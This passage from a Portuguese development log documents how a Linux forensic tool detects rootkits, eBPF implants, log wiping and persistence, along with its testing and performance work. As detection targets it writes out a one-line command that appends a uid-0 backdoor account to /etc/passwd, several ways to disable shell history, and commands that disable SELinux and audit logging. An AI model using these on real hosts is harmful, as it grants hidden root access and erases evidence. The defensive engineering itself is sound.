                   arquivo comum (com CAP_SYSLOG). Um hook em getdents64 é
                   ocultação de arquivo; em tcp4_seq_show, de conexão. Diz
                   COMO o kernel está mentindo, e complementa o cross-view
wtmp / utmp        o velociraptor parseia; a aletheia manda o operador olhar
                   ("confira contra o wtmp") em dezenas de evidências e nunca
                   olha. Formato binário de registro fixo
flags de montagem  `nosuid` muda o SIGNIFICADO de um achado de SUID, e hoje a
                   ferramenta não lê /proc/mounts
```

Os três são baratos. O primeiro é o de maior valor e o de maior risco de falso
positivo — bpftrace, kpatch e perf hookam legitimamente.

### Portabilidade, de novo

O número do `FS_IOC_GETFLAGS` **depende da arquitetura**: a macro é
`_IOR('f', 1, long)`, e `long` tem quatro bytes em 32 bits. Fixar `0x80086601`
faria a leitura falhar em todo host i686 — em silêncio, devolvendo "sem
atributo" para arquivos imutáveis.

É o mesmo eixo do `Ctim.Sec`, que já quebrou a compilação 32 bits neste
projeto. Aqui não quebraria nada: só mentiria.

### Estado

56 checks, 78 cenários, 118 execuções. Zero achado em Debian 12, Alpine 3.20 e
Ubuntu 14.04.

---

## Registro — as três fontes anotadas

### Montagem: dá SIGNIFICADO ao que outros checks já achavam

A tabela de montagem quase não produz achado próprio. O valor dela é modificar
o peso do que já existe:

```
/tmp montado com nosuid → o bit setuid de um arquivo ali é INERTE hoje,
                          e um `mount -o remount,suid` o ativa
```

É a mesma distinção que o check de rc.local já fazia com o bit de execução:
inerte agora, e o ctime data a ativação.

O sinal próprio veio depois, e ele é bom: **montagem por cima de diretório de
sistema**. Esconde o conteúdo real sem tocar em arquivo nenhum, não precisa de
módulo nem de preload, e some no reboot sem deixar rastro.

Primeira medição no host: `/boot/efi` acusado. É a partição EFI de toda máquina
UEFI — eu estava chamando **particionamento** de ocultação. A técnica tem forma
própria: ou é BIND, ou é filesystem de MEMÓRIA. Montar disco de verdade em ponto
de montagem de verdade é operação.

### Login: a ferramenta mandava olhar e nunca olhava

O wtmp aparecia em dezenas de evidências — *"confira contra o wtmp"*, *"compare
com o horário de trabalho"*. Mandar o operador a uma fonte é útil; ir até ela é
melhor, e o formato nunca justificou a omissão: registro binário de 384 bytes,
igual em 32 e 64 bits porque os campos de tempo são int32 de propósito.

O achado que valeu a pena é o CRUZAMENTO, e nenhuma das duas metades o dá:

```
btmp cheio de falhas     ruído de internet, todo host exposto tem
wtmp com uma entrada     o host funcionando
as duas na MESMA origem  como o invasor chegou, com hora e endereço
```

E o btmp é 0600 de root: sem privilégio, "nenhuma força bruta" viraria igual a
"não olhei as tentativas". A lacuna é declarada.

Um remendo meu que precisou sair: o filtro de origem descartava o registro de
BOOT procurando `"MANJARO"` na string, porque o campo de origem dele carrega a
versão do kernel. Funcionava num host e em nenhum outro — quem separa boot de
login é o TIPO do registro.

### ftrace: diz COMO o kernel estaria mentindo

Os checks de visão cruzada dizem que o kernel PODE estar mentindo. Este diz de
quê — e sem isso o operador sabe que há ocultação e não sabe do quê, o que não
orienta resposta nenhuma.

O check não lista todo hook: um host com bpftrace tem dezenas, todos legítimos.
Ele olha o ALVO, e interceptar uma função de ENUMERAÇÃO tem um propósito só:

```
getdents64      esconder ARQUIVO de quem lista
tcp4_seq_show   esconder CONEXÃO de quem lê /proc/net
kill            canal de comando por sinal, sem abrir porta
```

O discriminador é o CALLBACK: trampolim de eBPF é ferramenta de observação
(aviso); módulo nomeado interceptando enumeração é rootkit (crítico).

### A decisão difícil deste bloco

A primeira versão declarava lacuna sempre que `enabled_functions` não fosse
lido. Isso quebrou **38 cenários**: em contêiner o runtime mascara /sys/kernel,
e toda varredura em contêiner passaria a ser incompleta para sempre.

Era uma decisão de produto disfarçada de detalhe, e as duas saídas eram ruins:

```
declarar sempre    RESULT: OK deixa de existir em contêiner — e com ele morre
                   a única forma que a suíte tem de afirmar "limpo sai OK",
                   que é como ela pega falso positivo
não declarar       falsa garantia, que é o oposto da razão de a ferramenta
                   existir
```

A saída foi a distinção que eu não estava fazendo: **ausente e ilegível não são
a mesma coisa**.

```
existe e não abre   o host TEM a interface e falta privilégio → LACUNA, e a
                    ação é rodar como root
não existe          não há interface de tracing neste namespace. Contêiner não
                    tem kernel próprio → nada a examinar, do mesmo jeito que
                    não há unit para examinar num host sem systemd
```

O risco que sobra — kernel do host interceptado, varredura de dentro do
contêiner cega — é exatamente o que os checks de visão cruzada já declaram: se
o kernel mente, todas as fontes que dependem dele mentem juntas.

### Estado

60 checks, 81 cenários, 122 execuções. `make race` limpo. Zero achado em Debian
12, Alpine 3.20, Ubuntu 14.04, CentOS 7 e Rocky 9.

---

## Registro — otimização, medida antes de mexer

Perfil da coleta no host, antes:

```
pkg+hash+attrs   955ms
suid             797ms
githooks         135ms
crossview        133ms
TOTAL           2124ms
```

Duas fases eram 82%.

### O que estava errado na varredura de arquivos

Duas coisas, e a segunda vale mais que a primeira.

**Uma syscall por entrada, para descobrir o tipo.** O kernel devolve `d_type`
junto com o nome no readdir, e a varredura chamava `Lstat` em TODA entrada só
para saber se aquilo era diretório ou link. A maioria das chamadas existia para
descartar symlink. O stat ficou só onde é insubstituível: modo, tamanho e dono
de arquivo regular.

**A varredura era SEQUENCIAL enquanto o hash já era paralelo.** Um núcleo
trabalhando e onze esperando, num trabalho que é readdir mais stat — syscall,
que reparte entre núcleos exatamente como o hash repartiu.

Virou fila com trabalhadores:

```
suid   797ms → 111ms      7×
```

O detalhe que decide a correção da fila: **fila vazia não significa fim**. Um
trabalhador ocupado ainda pode empilhar subdiretórios, e parar antes dele
perderia galhos inteiros em silêncio. O fim é fila vazia E ninguém ativo.

### E a corrida que eu mesmo introduzi

O índice de pontos de montagem era construído de forma preguiçosa dentro de
`ehOutroFilesystem`. Isso era seguro enquanto a varredura era sequencial; com
vários trabalhadores viraram vários escrevendo o mesmo mapa.

Paralelizar não muda só a velocidade — muda quem pode tocar em quê. O índice
passou a ser montado antes de largar os trabalhadores, e o detector confirmou.

### O que sobrou, e por que não vale mexer

```
pkg+hash+attrs   827ms  (65%)   dos quais ~750ms são hash
suid             111ms
githooks         124ms
crossview        120ms
TOTAL           1276ms
```

O hash está perto do limite do hardware: 1 GB a ~1,3 GB/s com oito
trabalhadores. Ele já é paralelo, já tem teto de bytes, e o teto já MORDE num
desktop — os maiores arquivos (`libxul.so`, `chromium`) são pulados e
declarados. Num servidor o conjunto é uma fração disso e o teto nem encosta.

Reduzir mais exigiria hashear menos, e hashear menos é ver menos: o valor
disso é o Ebury, que troca biblioteca de sistema no lugar dela.

`githooks` e `crossview` somam 244ms e são sequenciais — a mesma fila
resolveria. Ficam anotados: 19% de ganho contra o risco de introduzir a segunda
corrida em duas horas.

### Resultado

```
scan   2124ms → 1276ms      40%
wtf    2088ms → 1285ms      dentro do orçamento de 2s da SPEC 6.1
```

Nenhum achado mudou: 122 execuções de cenário, `make race` limpo nos dois
pacotes.

---

## Registro — a outra metade da história de SSH, e a anti-forense

Vindos de ler o velociraptor, e os três fecham o MESMO padrão: fonte que a
ferramenta mandava olhar e nunca lia. É o terceiro caso — o wtmp foi o primeiro.

### Chave privada: para onde este host CONSEGUE ir

A ferramenta lia `authorized_keys`, que responde quem ENTRA. Não lia nada do
caminho inverso, e ele importa tanto quanto: um invasor que chegou aqui herda
tudo que este host alcança.

Sem senha, a chave é usada direto — não quebra nada, não abre sessão de teste,
não deixa tentativa registrada em lugar nenhum.

Três formatos, e cada um responde de um jeito:

```
PEM clássico   cabeçalho Proc-Type: 4,ENCRYPTED
PKCS#8         o próprio cabeçalho diz ENCRYPTED
OpenSSH novo   o corpo em base64 traz o nome da cifra, e `none` é sem senha
```

O terceiro é o padrão desde 2018 e o único que exige decodificar. Sem isso toda
chave moderna sairia como "sem senha" ou como "com senha" dependendo do palpite
— e as duas respostas erradas são piores que nenhuma.

Duas exclusões que evitam acusar toda instalação de SSH: chave de HOST
(`/etc/ssh/ssh_host_*`) é sem senha por desenho, e chave sem senha em automação
é a norma. Por isso o achado descreve ALCANCE e não erro — a pergunta é se
aquele alcance é aceitável para um host comprometido.

### Anti-forense: a categoria que não existia

Nenhum dos 60 checks anteriores olhava para a AUSÊNCIA deliberada de rastro.

```
.bash_history → /dev/null    o arquivo continua existindo para quem só olhar
                             se ele está lá
unset HISTFILE no .bashrc    o shell fica sem onde gravar
HISTSIZE=0, set +o history   as outras duas formas
```

O que a ferramenta NÃO faz é ler o CONTEÚDO do histórico. Julgar comando por
comando é trabalho humano e cheio de falso positivo; dizer que o registro foi
DESLIGADO é objetivo — ninguém escreve nenhuma dessas linhas sem querer.

Detalhe que decide: `Lstat` e não `Stat`. Seguindo o link vê-se um dispositivo
de tamanho zero, e a informação de que alguém o desviou some.

### known_hosts: o raio de alcance

Dezenas de evidências terminam em *"procure a mesma coisa na frota (§23)"* sem
dizer QUAIS máquinas. Esta diz.

Não é achado — é o tamanho do problema. Um servidor de aplicação com três
destinos e um bastion com quatrocentos são incidentes de escalas diferentes, e
a diferença não aparece em nenhum outro lugar.

Com `HashKnownHosts` o destino não volta, e a ferramenta diz isso em vez de
fingir lista completa: a CONTAGEM continua dimensionando o alcance.

### Os cenários usam chaves de verdade

Geradas com `ssh-keygen`, uma sem senha e uma com. Construir um blob que só o
meu parser aceita seria testar o parser contra a própria ficção — e a chave
cifrada existe para provar o outro lado: se ela saísse como aviso, o check
viraria "todo host que usa SSH tem um problema".

### Estado

63 checks, 84 cenários, 128 execuções. `make race` limpo. Zero achado em Debian
12, Alpine 3.20 e Ubuntu 14.04.

---

## Registro — auditoria da própria cobertura de teste

A pergunta foi "os cenários exercitam as implementações novas?". A resposta
honesta era **parcialmente**, e as lacunas importavam.

### Dado coletado que ninguém lia

Nove campos. O mesmo defeito do `f.Sudoers`, em escala menor — e um deles era
**implementação incompleta de uma afirmação minha**:

> a tabela de montagem dá SIGNIFICADO a achados de outros checks

Eu liguei `nosuid` no check de privilégio e **nunca liguei `noexec`** no de
caminho, que é o simétrico exato. Um processo rodando de um diretório montado
com noexec significa que ele começou antes da montagem ou foi iniciado de uma
cópia em outro lugar — as duas coisas o operador precisa saber.

O `Vazio` do histórico virou sinal ao cruzar com o wtmp: arquivo zerado numa
conta que TEM entrada registrada é `> ~/.bash_history`, a forma mais banal de
apagar rastro — não deixa link, não muda o rc, e some do olhar de quem só
verifica se o arquivo existe.

O `nodump` saiu: não trava nada e não é sinal.

### Caminhos sem cenário

```
exclusão de chave de HOST     NÃO exercitada — e se quebrar, TODO host
                              com SSH vira achado
3 das 4 formas de desligar    NÃO exercitadas
histórico
PEM, PKCS#8, EC               NÃO exercitados — só o OpenSSH novo
```

O primeiro é o falso positivo de maior alcance possível neste check, e não
havia nada impedindo o retorno.

### Nenhum dos falsos positivos corrigidos tinha teste

Quatro foram encontrados rodando em máquinas reais, corrigidos, e **nada
travava a volta**:

```
/boot/efi           partição EFI de toda máquina UEFI
truescale.conf      driver Intel empacotado
lightdm-settings    Manjaro empacota em /usr/local
/sbin/initctl       diversão do dpkg na imagem do Ubuntu
```

Nenhum é alcançável por cenário de contêiner: dependem de UEFI, de driver
Intel, de empacotamento do Manjaro e da imagem do Ubuntu. O nível certo é teste
unitário — com o dado que a máquina real produziu, não uma invenção próxima.
Sem isso o teste protege a versão simplificada do problema em vez do problema.

### E dois testes meus eram decorativos

O de partição chamava a função auxiliar em vez do check: quem apagasse a
chamada dela passaria com o teste verde. O de diversão verificava que uma lista
vazia não produz achado — verdade trivial que não exercita diversão nenhuma.

Os dois foram refeitos, e os dois foram VERIFICADOS revertendo a correção:

```
sem o corte de particionamento    "partição EFI: achado = true, quer false"
sem a exclusão de chave de host   as duas chaves do sshd viram aviso
```

Teste de regressão que não falha na regressão é decoração.

### Estado

63 checks, 84 cenários, 128 execuções, e a imagem limpa agora prova os quinze
checks acrescentados depois dela. Zero achado em Debian 12, Alpine 3.20 e
Ubuntu 14.04.

---

## Registro — mapa ATT&CK e a primeira lacuna fechada

O motivo de mapear não é conformidade. É que **os cenários desta suíte codificam
o que eu pensei**, e mais cenários provam principalmente que eu consigo
continuar pensando. Uma taxonomia externa acha buraco sem depender da minha
imaginação.

O mapa está em `ATTACK.md`. O produto dele é a lista de lacunas, não a de
coberturas.

### O que o mapa mostrou

Os pontos fortes ficaram onde eu esperava — persistência, sequestro do ligador,
setuid — e apareceu um agrupamento que eu não tinha visto como agrupamento:
**T1562 inteiro, "prejudicar defesas", estava vazio**. Auditoria, MAC e firewall
desligados: nenhum check olhava para nada disso.

E o mapa nomeou o que já se sabia sem nome: cobertura de TÉCNICA não é cobertura
de ADVERSÁRIO. O cenário 71 combina técnicas todas cobertas e continua exigindo
um humano para ver que são o mesmo ator.

### T1562.012 — a primeira fechada

É a mais valiosa por um motivo que vai além dela: **sem regra de auditoria o
kernel não emite registro de execução nenhum**. Não é uma defesa a menos — é a
investigação cega para todo o passado.

Três estados, e confundi-los era o risco inteiro do check:

```
nunca teve             não há configuração
instalado sem regra    o pacote veio com a distribuição, ninguém configurou
tinha e perdeu         havia regra e alguém a neutralizou com `-e 0`
```

Só o terceiro é achado. O `-e 0` é a forma mais silenciosa que existe: a
configuração continua no lugar, as regras continuam escritas, e nada é
registrado — quem só verifica se o arquivo existe não vê diferença.

### A linha que eu escrevi e apaguei

A primeira versão informava "este host não registra execução" como limite da
investigação, em todo host sem auditoria. É verdade, e não vale uma linha por
host: auditoria não é padrão em quase nenhuma distribuição, então a advertência
apareceria em praticamente todo servidor do mundo.

**Advertência que sai sempre é papel de parede.** E a ferramenta JÁ diz, em toda
varredura limpa, que o resultado não prova host limpo — repetir a mesma ressalva
por outro caminho não acrescenta nada.

Quem pegou isso foi o invariante `TestNenhumCheckDisparaEmHostLimpo`, que existe
exatamente para essa classe de erro. O cenário E5 agora PROÍBE o achado, em vez
de esperá-lo.

Junto veio um limite de conhecimento que decide o desenho: regra **deletada** e
regra **nunca escrita** são indistinguíveis em disco. Acusar sem poder separar
as duas seria acusar no escuro.

### Estado

64 checks, 89 cenários, 132 execuções. Zero achado em Debian 12, Alpine 3.20 e
CentOS 7.

### As próximas, na ordem do ATTACK.md

```
T1070.002  logs apagados        fecha a categoria que o histórico abriu
T1562.001  MAC desligado        SELinux permissivo, AppArmor descarregado
T1552.001  credencial em arquivo  ~/.aws, .env, kubeconfig — inventário
T1564.001  arquivo oculto       barato: a varredura já percorre /tmp
T1546.005  trap de shell        uma linha no reconhecimento que já existe
```

---

## Registro — T1070.002: logs apagados

A segunda do `ATTACK.md`, e ela fecha a categoria de anti-forense que o
histórico de shell abriu.

### A primeira ideia morreu na primeira medição

O sinal óbvio era arquivo de log VAZIO. Medido numa debian:12 recém-criada:

```
0 /var/log/btmp      0 /var/log/faillog
0 /var/log/lastlog   0 /var/log/wtmp
```

**Vazio é o estado normal de sistema novo** — os quatro arquivos de log da
imagem estão todos zerados. Um check baseado nisso acusaria toda instalação
limpa do mundo.

### O que sobrou é estrutural, e são duas coisas

**Buraco na rotação.** O logrotate produz sequência contígua e apaga o mais
ANTIGO quando passa do limite — nunca o do meio. Então `auth.log.1` e
`auth.log.3.gz` sem o `.2` não vem de rotação: veio de alguém removendo.

Não depende de julgar se um arquivo "deveria" ter conteúdo, e é por isso que
vale igual em host novo e em host de dez anos.

**Sessão sem registro.** Duas coisas que não podem ser verdade juntas:

```
/run/utmp tem sessão ABERTA agora
/var/log/wtmp não tem registro nenhum
```

Abrir sessão escreve nos dois. Se o histórico está vazio, ele foi zerado DEPOIS
que a sessão abriu — e é o primeiro arquivo que se apaga, porque é o que datava
a entrada.

O cruzamento é o que torna isto utilizável: `wtmp` vazio SOZINHO é o estado de
toda instalação nova.

### E a mesma forma, legítima

Várias distribuições rotacionam o wtmp. Logo depois disso o arquivo vivo está
vazio COM sessão aberta — exatamente a forma acusada, e inteiramente normal.

O que separa é o `wtmp.1` ao lado, procurado ANTES de acusar. O cenário F3
existe só para isso: sem ele, o check acusaria todo host na semana da rotação.

### Estado

66 checks, 92 cenários, 138 execuções. `make race` limpo. Zero achado em Debian
12, Alpine 3.20, Ubuntu 14.04 e CentOS 7 — e nenhum no host real, que tem
rotação de verdade.

---

## Registro — T1562.001 e a mudança para VM

### O check: contradição, não estado

Desligar o MAC é passo comum depois de entrar. Acusar isso é que é difícil, e a
medição mostrou por quê: um host meu tem **158 perfis de AppArmor com o módulo
desligado** — é como o Manjaro entrega. Um check que acusa "MAC inativo"
acusaria toda instalação padrão.

O que é objetivo é a CONTRADIÇÃO entre duas fontes:

```
/etc/selinux/config       diz o que o administrador QUIS
/sys/fs/selinux/enforce   diz o que está valendo AGORA
```

Nenhum sistema se instala auto-contraditório. Config pedindo enforcing com o
kernel em permissivo é `setenforce 0` depois do boot — e isso **não sobrevive a
um reboot**, o que torna a decisão recente por definição e delimita a janela.

É a mesma forma dos checks de visão cruzada: duas fontes para o mesmo fato, e o
achado mora na divergência.

### Por que estes cenários foram para a VM

`/sys/fs/selinux` não existe em contêiner nenhum — o runtime mascara /sys. Este
check não era testável em lugar nenhum antes.

E aproveitando, o que já dependia de privilégio emprestado mudou junto:

```
D1 montagem por cima   exigia --privileged   → G4, root de verdade
D3 hook de ftrace      exigia SYS_ADMIN      → G3, tracefs do próprio guest
C1 capability em xattr exigia SETFCAP        → VM
C2 implante imutável   exigia LINUX_IMMUTABLE → VM
```

Contêiner privilegiado é uma concessão: não se parece com o servidor que se
varre, e o runtime ainda mascara /sys por baixo. Manter as duas versões seria
cobertura duplicada no pior dos dois ambientes — D1 e D3 foram REMOVIDOS, não
duplicados.

### Dois defeitos no próprio harness, achados por usá-lo

**O log do setup era descartado.** Falha de cenário na VM devolvia só
`SETUP-FALHOU rc=N`, sem uma linha do que aconteceu. Um harness que esconde a
causa custa mais tempo que o cenário que ele testa. Corrigido, e a primeira
execução já entregou o erro exato: `mkdir: can't create '/sys/fs/selinux'` —
sysfs não aceita criar diretório, e a saída é montar tmpfs POR CIMA.

Junto veio um bug de shell no próprio conserto: dentro de `if ! cmd`, o `$?`
é o do `!` e vale sempre zero. A primeira versão reportava `rc=0` para toda
falha.

**O relatório humano nunca era capturado em VM.** O init redirecionava só o
stderr, e com `--json ARQUIVO` o relatório humano sai pelo STDOUT. O comentário
ali prometia que ele ia junto — e ele nunca foi, então nenhuma asserção de saída
humana funcionava em modo VM. São 19 asserções desse tipo na suíte.

Os dois são a mesma classe: **o harness perdendo informação em silêncio**, que é
exatamente o defeito que a ferramenta testada existe para não cometer.

### Estado

67 checks, 94 cenários, 138 execuções — 14 delas em VM com kernel próprio.

---

## Registro — trap de shell e credencial em arquivo

Duas lacunas do mapa, e as duas custaram pouco porque a estrutura já existia.

### Trap: uma linha no classificador que já era usado

`trap` associa comando a evento do shell. Num arquivo de INICIALIZAÇÃO isso é
persistência — vale para toda sessão da conta, e o comando não aparece em lista
de processo, nem em cron, nem em unit.

```
DEBUG   roda ANTES DE CADA COMANDO: execução contínua, e registrador do que
        se digita
EXIT    roda ao encerrar a sessão, quando ninguém está olhando
ERR     roda a cada comando que falha
```

Duas exclusões que o teste trava: `trap - INT` apenas RESTAURA o padrão e não
executa nada, e `trap` no meio de outra palavra — `/usr/bin/mytrap` — não arma
armadilha nenhuma.

### Credencial: inventário, e um único juízo objetivo

É o que um invasor procura PRIMEIRO, e o que define até onde ele vai. Mas a
ferramenta não sabe quais credenciais são esperadas — **todo servidor de
aplicação tem credencial de aplicação**, é assim que ele funciona.

Então o achado é inventário, e o único juízo é a permissão:

```
0644   o segredo deixou de depender da conta dona, e qualquer processo do
       host o alcança                                              → AVISO
0600   é o desenho normal                                          → inventário
```

O conteúdo NÃO é lido, deliberadamente: carregar segredo para dentro da memória
da ferramenta, e daí para dentro de um relatório que vai para um ticket, cria
exposição em vez de reduzir.

### O falso positivo que apareceu no primeiro host

`~/.ssh/config` em 0644, acusado de credencial exposta. Ele é CONFIGURAÇÃO —
aponta para chave e destino, não contém nenhum dos dois — e 0644 é o modo normal
dele.

O critério ficou estreito: **o arquivo tem que CONTER credencial, não apontar
para uma.** `.aws/config` saiu pelo mesmo motivo, e onde este host se conecta já
é respondido pelo `known_hosts`. Há teste travando isso.

### Estado

68 checks, 95 cenários, 140 execuções. Quatro das seis lacunas do `ATTACK.md`
fechadas; restam arquivo oculto em diretório temporário e conta criada na janela
do incidente.

---

## Registro — as duas últimas lacunas com sinal

### Conta que não passou pelo `useradd`

O acesso permanente mais antigo que existe cabe num `echo`:

```
echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd
```

E deixa um rastro estrutural que quem o escreve quase sempre esquece: o
`useradd` escreve em `/etc/passwd` E em `/etc/shadow`, **sempre**. Uma conta só
no primeiro nunca passou por ele.

Medido antes de escrever o check, nas quatro distribuições da matriz:

```
debian:12    passwd=18  shadow=18  só-em-passwd=[]
alpine:3.20  passwd=17  shadow=17  só-em-passwd=[]
centos:7     passwd=15  shadow=15  só-em-passwd=[]
ubuntu:14.04 passwd=20  shadow=20  só-em-passwd=[]
```

Batem conta por conta, sem exceção. Divergência aqui não é variação de
distribuição — e o backdoor plantado sai com DOIS sinais correlacionados, este e
o de uid 0.

Uma guarda que decide: sem root o shadow é ilegível e o mapa vem vazio, o que
marcaria TODA conta do host. A lacuna já era declarada pelo leitor do shadow, e
o check só olha quando há shadow.

### Executável escondido, e a colisão entre duas decisões minhas

Fecha um limite escrito em voz alta no check de propriedade: *"um binário
largado em disco e nunca executado não entra — isso é a §8, e ela exige
varredura de filesystem"*. A varredura já existia; faltava olhar o que ela
passava na frente.

E aí apareceu uma colisão que vale mais que o check: **a lista de poda que
acelerou a varredura incluía `.cache`** — exatamente onde este check procura. As
duas decisões se encontravam num ponto só, e a mais antiga vencia em silêncio.

A poda existe por VOLUME: um home de desenvolvedor tem 270 mil diretórios. `/tmp`
e `/var/tmp` não têm volume nenhum, então a poda passou a não valer ali.

### E o falso positivo do primeiro host real

Dois achados de catorze arquivos cada, todos `*.sample` — os hooks de exemplo
que o git entrega em toda cópia, em modo 755, e que ele nunca executa. Apareceram
em diretório de build do gerenciador de pacotes, com repositórios clonados.

A regra não era nova nesta base: **o coletor de hooks de git já pula `.sample`
pelo mesmo motivo.** Ela é que não tinha sido aplicada aqui — a mesma decisão,
tomada duas vezes, aplicada uma.

### Uma lacuna no harness, achada pelo cenário

Existia `Forbid` para achado e nada para SAÍDA. O cenário H2 planta o esconderijo
E os hooks de exemplo ao lado, e precisa provar que só o primeiro apareceu — sem
negativa sobre a saída, a alternativa era afirmar contagem de achados, que quebra
à primeira mudança de formatação e não diz o que está sendo protegido.

`ForbidOutput` existe pelo mesmo motivo do `Forbid`: a negativa vale tanto quanto
a afirmativa.

### Estado

70 checks, 97 cenários, 144 execuções. `make race` limpo. Zero achado em Debian
12, Alpine 3.20, Ubuntu 14.04, CentOS 7 e Rocky 9.

**Seis das sete lacunas do `ATTACK.md` fechadas.** Sobrou a de pior relação
custo/sinal — AppArmor em modo complain e firewall vazio —, que é o resultado
esperado de trabalhar uma lista priorizada até o fim.

---

## Registro — teste de mutação

Era o item 3 da minha própria lista de "o que subiria a confiança". Os dois
primeiros já tinham sido feitos; este é o que mede em vez de afirmar.

### Por que, exatamente

Cobertura diz quais linhas foram EXECUTADAS. Não diz se alguém estava olhando.
Um teste que executa uma linha e não afirma nada sobre ela conta como cobertura
e não protege nada — e `facts` estava em 37%, com as duas últimas auditorias
achando defeito justamente ali.

A mutação faz a pergunta certa: **se eu estragar esta decisão, algum teste
reclama?**

As mutações não vêm de catálogo genérico — vêm do que ESTE código decide:
severidade, limiar e guarda. É nelas que um defeito vira falso positivo ou
achado perdido.

### O número

```
70%   mortas, só com os testes unitários       (amostra de 40)
67%   mortas, unitários + cenários             (amostra de 12)
```

O segundo número parece pior e não é: são amostras diferentes, e é justamente
esse o defeito que a primeira versão do script escondia — ele prometia
comparabilidade entre execuções via semente fixa, e **assim que o fonte muda os
números de linha mudam junto**. Comparar taxas entre versões diferentes do
código compara coisas diferentes. O comentário agora diz isso.

### Dois achados reais, de tipos diferentes

**Teste que faltava.** Rebaixar a severidade do estado "auditoria instalada e
sem regra de execve" passou pela suíte inteira. Não havia cenário para o
terceiro estado do check — o que mais engana, porque a presença do auditd faz
parecer que há trilha.

Junto, o mesmo tipo: rebaixar o ramo do `rc.local` SEM bit de execução também
passava. A razão apareceu ao procurar — **todos** os cenários de rc.local fazem
`chmod +x`. A distinção que a ferramenta faz de propósito, entre arma carregada
e arma disparada, nunca tinha sido exercitada.

**Decisão que não se pagava.** O ramo que promovia a crítico um interpretador
com setuid sobreviveu — e a investigação explicou: ele só MUDA alguma coisa num
caso contorcido (sem dono, fora de diretório gravável, dono não-root e nome
preservado). Nos caminhos reais a severidade já é crítica por outro motivo.

Eu já tinha escrito, no cenário C1, que aquele reconhecimento "não é detecção,
porque é por NOME e invasor renomeia". A mutação mostrou a consequência: o ramo
de DECISÃO não se pagava. A nota continua — saber que executar aquilo já devolve
privilégio muda o que o operador faz primeiro —, o que saiu foi o `if` que
mudava severidade.

Essa é a categoria mais rara e a mais valiosa: código que pode sair.

### E os sobreviventes que NÃO são lacuna

Nem todo sobrevivente é defeito. Dois exemplos desta rodada:

```
i >= 0 → i > 0    num índice que nunca pode ser zero (a linha de sudoers
                  nunca COMEÇA com NOPASSWD:) — mutação equivalente
&& → ||           numa condição onde a precedência do Go faz o resultado ser
                  o mesmo em todo caminho testado
```

O script não distingue equivalente de sobrevivente, e isso é limite conhecido: a
distinção exige ler o código, que é o trabalho que ele existe para direcionar.

### Estado

70 checks, 99 cenários, 148 execuções. `make mutacao` é alvo próprio.

---

## Registro — a perna do kernel: eBPF e taint

A fase 8 era a última do `SPEC 15` com sinal de detecção que continuava aberta,
e a razão de ela vir agora não é a ordem da lista.

### O ponto cego estava escrito no código e invisível na saída

```go
// internal/env/env.go, antes desta fase
e.grant(CapBPF, false, "enumeração de eBPF ainda não implementada (fase 8)")
```

A capacidade era sondada, negada e explicada. E **nenhum check a exigia** — o
rodapé de cobertura só imprime motivo de check `NOT_CHECKED`, então aquela
frase nunca chegava a um operador. Um host com implante em eBPF saía
`RESULT: OK` e o relatório não dizia que ninguém tinha olhado para lá.

É a única forma de lacuna que esta ferramenta não pode ter: a que ela conhece e
não conta. O invariante "limite vira NOT_CHECKED, nunca truncamento silencioso"
existe exatamente contra isso, e estava sendo violado pelo próprio `env`.

### O que um programa eBPF é, no modelo desta ferramenta

Todo o resto da base pergunta por ARQUIVO ou por PROCESSO. Um programa eBPF não
é nenhum dos dois: depois de carregado ele vive dentro do kernel, sem caminho em
disco, sem entrada em `/proc/modules`, sem inode para comparar hash e sem pacote
que o reivindique. O `find` não acha, a §24 não tem opinião, a §7 não tem onde
olhar — e ele intercepta syscall, lê pacote e altera retorno com a força de um
módulo.

É o implante fileless que o modelo de RETRATO ainda enxerga, desde que alguém
pergunte ao kernel pela `bpf(2)`. Nativo pelo mesmo motivo da §24: `bpftool` não
está instalado na maioria dos servidores, e perguntar a ele transformaria "não
verifiquei" em "não encontrei".

### A pergunta certa não é "há eBPF neste host?"

Há em todo host com systemd moderno, e num nó de Kubernetes há dezenas. A
pergunta é **quem segura este programa** — porque ele só continua carregado
enquanto alguém o segurar, e os detentores são conhecidos:

```
descritor aberto   /proc/<pid>/fd + fdinfo        toda ferramenta com libbpf
perf_event legado  BPF_TASK_FD_QUERY              bpftrace e agente antigo
pin no bpffs       arquivo, com caminho e data    cilium, bpfman
link               enumerável pela bpf(2)         o mecanismo moderno
tail call          entrada de prog_array          o datapath do cilium
```

Nenhum dos cinco é achado. **Nenhum dos cinco aparecendo** é o achado, e é a
forma do implante: alguém carregou, anexou e foi embora.

O segundo item da lista é o que mais trabalho deu e o que menos aparece. No
caminho antigo — `perf_event_open` num kprobe e o programa pendurado por ioctl
— não existe link, e o descritor que segura é um `perf_event`, cujo fdinfo NÃO
cita o programa. Sem perguntar ao kernel, todo bpftrace do mundo viraria um
crítico.

### E o TIPO decide se a pergunta pode ser respondida

Programa de tc, de xdp e de cgroup é segurado por INTERFACE e por CGROUP —
coisas que se leem por netlink e por `BPF_PROG_QUERY`, e esta ferramenta não faz
nem uma nem outra. Ali "sem dono" não significa nada, e acusar produziria achado
em todo host com cilium.

Esses viram **lacuna declarada com o número junto**, no rodapé de cobertura, em
vez de acusação. Tipo que o binário não conhece — kernel mais novo que ele — cai
na mesma regra: não se acusa o que não se sabe interpretar.

### O defeito que o teste de layout pegou antes da primeira execução

A `bpf_attr` declara todo endereço como `__aligned_u64`: oito bytes em qualquer
arquitetura. Em Go um ponteiro tem quatro bytes em 32 bits, e a primeira versão
resolveu isso com um preenchimento calculado em tempo de compilação:

```go
type ponteiro64 struct {
	p unsafe.Pointer
	_ [8 - unsafe.Sizeof(unsafe.Pointer(nil))]byte   // errado
}
```

Parecia elegante. Em Go, **campo de tamanho zero no fim de uma struct ganha
padding** — a struct saiu com dezesseis bytes em x86_64, e o deslocamento de
todo campo seguinte mudou junto. Nada disso quebra a compilação: quebra a
leitura de mapa e a consulta de perf_event, em silêncio, devolvendo o conteúdo
de outro campo.

O `ponteiro64` foi para os arquivos por arquitetura, ao lado do número da
syscall — que é o outro eixo que varia. É o mesmo tipo de defeito do
`FS_IOC_GETFLAGS`, e desta vez ele morreu antes de rodar.

### Taint: a evidência que o invasor não consegue apagar

O taint do kernel é MONOTÔNICO. Escrever em `/proc/sys/kernel/tainted` faz OR
com o valor atual, e nem o root limpa sem reiniciar. Um módulo que se carrega,
suja o kernel e depois se desencadeia da lista para sumir **deixa o bit para
trás**.

Quase nada nesta base tem essa propriedade — log se apaga, arquivo se remove,
histórico se desliga, e cada um desses tem um check de anti-forense justamente
porque some.

E o achado não é o estado, é a ATRIBUIÇÃO que falta. Medido num desktop real:

```
